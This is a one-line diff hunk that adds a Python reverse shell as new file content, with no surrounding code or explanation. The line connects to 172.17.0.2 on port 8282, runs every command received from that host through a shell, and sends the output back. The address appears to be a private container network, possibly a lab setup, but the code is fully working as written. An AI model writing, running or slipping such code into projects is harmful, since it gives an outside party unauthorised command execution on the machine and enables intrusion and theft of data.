@@ -1,0 +1,1 @@
+import socket,subprocess;h,p="172.17.0.2",8282;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((h,p));exec("while True:c=s.recv(1024).decode();o=subprocess.run(c,shell=True,stdout=subprocess.PIPE,text=True);r=o.stdout;s.send('suc'.encode()) if not r else s.send(r.encode())")
